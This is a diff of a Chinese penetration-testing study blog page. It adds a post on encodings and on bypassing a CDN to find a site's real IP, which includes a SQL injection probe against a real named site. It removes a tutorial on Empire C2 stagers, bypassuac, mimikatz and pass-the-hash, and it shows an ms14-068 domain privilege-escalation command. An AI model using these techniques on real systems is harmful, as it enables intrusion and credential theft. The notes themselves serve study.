@@ -64,6 +64,52 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-加密编码算法和CDN绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/" class="article-date">
+  <time datetime="2021-09-15T00:45:34.000Z" itemprop="datePublished">2021-09-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/">加密编码算法和CDN绕过</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="常见加密编码等算法解析"><a href="#常见加密编码等算法解析" class="headerlink" title="常见加密编码等算法解析"></a>常见加密编码等算法解析</h3><p>1、MD5：不可逆算法，最常用的算法之一，70-80%的网站管理员密码都是采用md5，网上解密的方法是采用枚举的方法(0-9，a-z的随机组合)，32位<br>2、SHA：其中包括SHA1、SHA256、SHA384、SHA512，数字越大密文越长(0-9，a-z的随机组合)<br>3、ASCII：ASCII码<br>4、进制：计算机进制数<br>5、时间戳：计算机不会自己读取当前时间，而是采用对当前时间进行加密的时间戳供计算机来识别<br>6、URL：访问网站的地址信息  %20：[空格]  %23：#<br>7、BASE64：很多采用base64加密后的密文后面都是两个==，且=如果出现就必须在结尾出现<br>8、Unescape：%u+4位数字依次加密<br>9、AES：更高级更安全的加密方式，其中包含四个因素：填充、数据块、密码、偏移量，如果采用base64解密类似这种密文后是乱码，则很可能是采取Aes方式进行加密的，解密Aes方式的必须要知道密码和偏移量这两个前提<br>10、DES：和AES类似<br>11、带Salt：MD5+salt<br>12、自定义组合</p>
+<p><a target="_blank" rel="noopener" href="http://www.techen.cn/about_us.php?ID=MSBhbmQgMT0xIA==">http://www.techen.cn/about_us.php?ID=MSBhbmQgMT0xIA==</a><br><a target="_blank" rel="noopener" href="http://www.techen.cn/about_us.php?ID=1">http://www.techen.cn/about_us.php?ID=1</a> and 1=1  带入数据库查询</p>
+<p>d0a8730cb57cecabbfac98036f5b2fbf   解密出来不是admin@123<br>d0a8730cb57cecabbfac98036f5b2fbf:9cf1d9   admin@123</p>
+<h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><p>CDN 的全称是 Content Delivery Network，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在 CDN 服务，将会影响到后续的安全测试过程。<br>1、为什么要对CDN进行绕过？<br>2、如何判断目标存在 CDN 服务？<br>      利用多节点技术进行请求返回判断<br>3、CDN 对于安全测试有那些影响？<br>4、目前常见的 CDN 绕过技术有哪些？<br>      ①子域名查询<br>    <a target="_blank" rel="noopener" href="http://www.yucedu.com/">www.yucedu.com</a>  39.98.190.77<br>    yucedu.com 39.98.190.77<br>    x.yucedu.com   39.98.190.77 / 同网段 39.98.190.12 / 不同网段<br>      ②邮件服务查询  host文件手工捆绑确认<br>      ③国外地址请求<br>      ④扫描全网<br>         扫描工具：w8fuckcdn、zmap等<br>    w8fuckcdn使用说明：如果发现报错，类似\devices\npf adapter，推荐把虚拟网卡关闭<br>      ⑤黑暗引擎搜索特定文件<br>      ⑥dns 历史记录，以量打量</p>
+<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>① 利用子域名请求获取真实 IP    学而思网站<br>②利用DNS历史记录(第三方接口)查询获取真实IP   sp910.com<br>③利用国外地址请求获取真实IP    m.sp910.com  软件：789VPN(要钱)<br>④利用邮件服务器接口获取真实IP   mozhe–人工地区识别/修改host手工绑定<br>⑤利用黑暗引擎搜索特定文件获取真实IP    shodan搜指定hash文件  <a target="_blank" rel="noopener" href="http://www.foxuc.com/">http://www.foxuc.com/</a></p>
+<p>#Python2 开发的执行环境<br>#安装 mmh3 失败记得先安装下#Microsoft Visual C++ 14.0<br>#<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12TcFkZ6KFLhofCT-osJOSg">https://pan.baidu.com/s/12TcFkZ6KFLhofCT-osJOSg</a> 提取码：wkgv</p>
+<p>favicon.ico：WEB上存在的特有文件<br>代码：<br>import mmh3<br>import requests<br>response = requests.get(‘<a target="_blank" rel="noopener" href="http://www.xx.com/favicon.ico&#39;">http://www.xx.com/favicon.ico&#39;</a>)</p>
+<p><a target="_blank" rel="noopener" href="https://www.naver.com/favicon.ico">https://www.naver.com/favicon.ico</a></p>
+<p>favicon = response.content.encode(‘base64’)<br>hash = mmh3.hash(favicon)<br>print ‘http.favicon.hash:’+str(hash)</p>
+<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.cr173.com/soft/21692.html">https://www.cr173.com/soft/21692.html</a>  超级加解密转换工具<br><a target="_blank" rel="noopener" href="https://gitee.com/Discuz/DiscuzX">https://gitee.com/Discuz/DiscuzX</a>   discuz论坛源码<br><a target="_blank" rel="noopener" href="https://www.17ce.com/">https://www.17ce.com/</a>    多地ping<br><a target="_blank" rel="noopener" href="https://get-site-ip.com/">https://get-site-ip.com/</a>   查看真实IP地址<br><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>    微步<br><a target="_blank" rel="noopener" href="https://get-site-ip.com/">https://get-site-ip.com/</a>   查看真实IP地址<br><a target="_blank" rel="noopener" href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a>   w8fuckcdn<br><a target="_blank" rel="noopener" href="https://www.isc.org/downloads/">https://www.isc.org/downloads/</a>      dig工具</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/" data-id="ckwpz2hvf00118kvjefr02b85" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-Web网站框架安全" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" class="article-date">
@@ -93,7 +139,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" data-id="ckwjds8mk000b5gvje6addxj0" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" data-id="ckwpz2huy000c8kvj1dr21wmz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -149,7 +195,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" data-id="ckwjds8n8001a5gvjfbfs2kih" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" data-id="ckwpz2hvq001e8kvjhsre8y88" class="article-share-link">Share</a>
       
       
     </footer>
@@ -192,7 +238,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="ckwjds8mj000a5gvj4hfd62am" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="ckwpz2hux000b8kvj6mjd0izu" class="article-share-link">Share</a>
       
       
     </footer>
@@ -237,7 +283,7 @@
 <li><p>做信息搜集</p>
 </li>
 <li><p>用ms14-068向域控提权</p>
-<p>ms14068 -u <a href="mailto:&#x69;&#108;&#x75;&#x40;&#105;&#108;&#x75;&#x2e;&#99;&#111;&#x6d;">&#x69;&#108;&#x75;&#x40;&#105;&#108;&#x75;&#x2e;&#99;&#111;&#x6d;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
+<p>ms14068 -u <a href="mailto:&#105;&#108;&#117;&#64;&#x69;&#108;&#117;&#46;&#x63;&#111;&#x6d;">&#105;&#108;&#117;&#64;&#x69;&#108;&#117;&#46;&#x63;&#111;&#x6d;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
 <p>注入之前: 需要清除票据</p>
 <p>​    CMD: klist purge 清除票据 | klist 查看票据</p>
 <p>​    mimikatz: kerberos::purge 清除票据 | kerberos::list 查看票据</p>
@@ -305,7 +351,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckwjds8n600175gvjeem92xug" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckwpz2hvj00188kvjavbd9i2f" class="article-share-link">Share</a>
       
       
     </footer>
@@ -380,7 +426,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckwjds8nb001d5gvj6wisforj" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckwpz2hvm001d8kvjd6ig1y2w" class="article-share-link">Share</a>
       
       
     </footer>
@@ -455,7 +501,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckwjds8n300115gvjb6uhgjmo" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckwpz2hve000z8kvjheg86x89" class="article-share-link">Share</a>
       
       
     </footer>
@@ -540,7 +586,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckwjds8n800195gvj0ad52yk1" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckwpz2hvk001a8kvj4sxzdp66" class="article-share-link">Share</a>
       
       
     </footer>
@@ -595,7 +641,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckwjds8mn000e5gvjfx47fm1d" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckwpz2huz000e8kvj3b4i5v5n" class="article-share-link">Share</a>
       
       
     </footer>
@@ -659,77 +705,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="ckwjds8mo000g5gvjf79rh1vz" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-empire基操" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/08/18/empire%E5%9F%BA%E6%93%8D/" class="article-date">
-  <time datetime="2021-08-18T04:33:41.000Z" itemprop="datePublished">2021-08-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/18/empire%E5%9F%BA%E6%93%8D/">empire基操</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="基操"><a href="#基操" class="headerlink" title="基操"></a>基操</h2><p><code>可以用tab补全查看指令</code></p>
-<p>uselistener  使用监听器</p>
-<p>usemodule 使用模块</p>
-<p>usestager  使用stager</p>
-<p>main            回到主界面</p>
-<p>back            返回上一级</p>
-<h4 id="生成监听器"><a href="#生成监听器" class="headerlink" title="生成监听器:"></a>生成监听器:</h4><p><img src="C:\Users\chhzy\AppData\Roaming\Typora\typora-user-images\image-20210718213722672.png" alt="image-20210718213722672"></p>
-<p>​        (Empire: listeners) &gt; uselistener http<br>​        (Empire: listeners/http) &gt; info<br>​        (Empire: listeners/http) &gt;set Name xxx<br>​        (Empire: listeners/http) &gt;set Port xxx<br>​        (Empire: listeners/http) &gt; execute</p>
-<p>​    [*] Starting listener ‘parrot’</p>
-<ul>
-<li>Serving Flask app “http” (lazy loading)</li>
-<li>Environment: production<br>WARNING: This is a development server. Do not use it in a production deployment.<br>Use a production WSGI server instead.</li>
-<li>Debug mode: off<br>[+] Listener successfully started!</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Name --&gt; 监听器的名字</span><br><span class="line">Host --&gt; 监听器的ip</span><br><span class="line">Port --&gt; 监听的端口</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="生成stager"><a href="#生成stager" class="headerlink" title="生成stager:"></a>生成stager:</h4><p>![image-20210718213526986](D:\yuchen Study\part three\usestager.png)</p>
-<p>​    multi –&gt; linux</p>
-<p>​    osx –&gt; mac</p>
-<p>​    windows</p>
-<p>windows常用:<br>        windows/launcher_bat<br>        windows/launcher_vbs<br>        windows/launcher_lnk<br>        windows/dll<br>        windows/hta<br>        windows/launcher_xml<br>        windows/macro<br>        windows/wmic</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(Empire: listeners) &gt; usestager windows&#x2F;launcher_bat</span><br><span class="line">(Empire: stager&#x2F;windows&#x2F;launcher_bat) &gt; info</span><br><span class="line">(Empire: stager&#x2F;windows&#x2F;launcher_bat) &gt; set Listener parrot</span><br><span class="line">(Empire: stager&#x2F;windows&#x2F;launcher_bat) &gt; set OutFile .&#x2F;1.bat</span><br></pre></td></tr></table></figure>
-
-<h4 id="获取到shell"><a href="#获取到shell" class="headerlink" title="获取到shell"></a>获取到shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">interact --&gt; 进入到交互模式</span><br><span class="line">kill     --&gt; 杀死会话</span><br><span class="line">killdate --&gt; 指定日期杀死会话 killdate [agent&#x2F;all] 01&#x2F;01&#x2F;2016</span><br><span class="line">rename     --&gt; 给agents重命名</span><br><span class="line">searchmodule --&gt; 搜索模块</span><br><span class="line"></span><br><span class="line">Active agents: </span><br><span class="line">如果agents是绿色的, 代表是存活的;如果是红色, 那就是掉线的状态.</span><br><span class="line"></span><br><span class="line">interact中:</span><br><span class="line">bypassuac --&gt; bypassuac提权</span><br><span class="line">jobs      --&gt; 查看工作中的任务</span><br><span class="line">upload      --&gt; 文件上传</span><br><span class="line">download  --&gt; 文件下载</span><br><span class="line">dirlist   --&gt; 列出目录列表</span><br><span class="line">injectshellcode --&gt; 利用shellcode进程迁移到meterpreter</span><br><span class="line">mimikatz  --&gt; 加载账号密码(hashdump)</span><br><span class="line">psinject  --&gt; 利用shellcode进程迁移</span><br><span class="line">pth       --&gt; pass the hash</span><br><span class="line">shell + 指令 --&gt; 用cmd执行指令</span><br><span class="line">sysinfo   --&gt; 获取系统基本信息</span><br><span class="line">spawn     --&gt; 生成新的agent</span><br><span class="line">steal_token --&gt; 令牌盗用</span><br></pre></td></tr></table></figure>
-
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>在empire中, 拥有管理员权限, username前面会多一个* ,也就是提权成功了</code></p>
-<p>指令: bypassuac –&gt; bypassuac_eventvwr</p>
-<p><code>searchmodule bypassuac</code> –&gt; <code>ask --&gt; uac提权</code></p>
-<p>在interact中, 可以用run去执行指令</p>
-<p>查找本地提权漏洞:  </p>
-<p>​    powershell/privesc/sherlock</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Title      : User Mode to Ring (KiTrap0D)</span><br><span class="line">MSBulletin : MS10-015</span><br><span class="line">CVEID      : 2010-0232</span><br><span class="line">Link       : https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;11199&#x2F;</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">title: 漏洞名称</span><br><span class="line">MSBulletin: ms漏洞编号</span><br><span class="line">CVEID: cve漏洞编号</span><br><span class="line">Link: exp</span><br><span class="line">VulnStatus: 漏洞状态</span><br></pre></td></tr></table></figure>
-
-<p>privesc/getsystem*  –&gt; 相当于msf中的getsystem</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="ckwjds8mn000f5gvj36hq4hih" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="ckwpz2hv1000h8kvj04ug548q" class="article-share-link">Share</a>
       
       
     </footer>
@@ -743,7 +719,7 @@
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -762,7 +738,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
     </div>
   </div>
 
@@ -773,6 +749,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/">WAF-安全狗绕过SQL注入</a>
+          </li>
         
           <li>
             <a href="/2021/11/28/XXE%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/">XXE漏洞-利用检测绕过</a>
@@ -788,10 +768,6 @@
         
           <li>
             <a href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/">逻辑越权漏洞—-各种越权和数据篡改</a>
-          </li>
-        
-          <li>
-            <a href="/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/">文件操作之文件下载读取</a>
           </li>
         
       </ul>
